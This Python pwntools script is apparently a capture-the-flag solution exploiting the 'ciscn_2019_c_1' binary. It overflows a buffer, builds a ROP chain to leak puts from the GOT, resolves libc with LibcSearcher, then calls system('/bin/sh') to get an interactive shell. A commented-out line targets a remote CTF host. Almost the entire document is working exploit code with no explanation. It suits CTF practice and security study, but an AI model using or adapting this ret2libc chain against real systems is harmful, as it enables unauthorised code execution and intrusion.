from pwn import *
from LibcSearcher import *

def encrypt(string):
    newstr = list(string)
    for i in range(len(newstr)):
        c = ord(string[i])
        if c <= 96 or c > 122:
            if c <= 64 or c > 90:
                if c > 47 and c <= 57:
                    c ^= 0xF
            else:
               c ^= 0xE
        else:
            c ^= 0xD
        newstr[i] = chr(c)
    return ''.join(newstr)
#p = remote('node3.buuoj.cn',29403)
p = process('./ciscn_2019_c_1')
elf = ELF('./ciscn_2019_c_1')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x0000000000400C83 #pop rdi;ret;
#start_addr = 0x0000000000400790
main_addr = 0x000000000400B28 
p.recv()
p.sendline('1')
p.recvuntil('encrypted\n')

payload = '1'*0x58+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
p.sendline(encrypt(payload))

#print encrypt(payload)

p.recvuntil('Ciphertext\n')
p.recvuntil('\n')

addr = u64(p.recvuntil('\n', drop=True).ljust(8,'\x00'))

print "addr=", hex(addr)

libc = LibcSearcher('puts', addr)
libcbase = addr - libc.dump('puts')

print 'str_bin_sh=',hex(libc.dump('str_bin_sh'))
print libc.dump('system')

p.recv()
p.sendline('1')
p.recvuntil('encrypted\n')
sys_addr = libcbase + libc.dump('system')
bin_sh = libcbase + libc.dump('str_bin_sh')

payload = '1'*0x58+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)
ret = 0x4006b9
payload_Ubuntu18 = '1'*0x58+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)
p.sendline(payload)
p.interactive()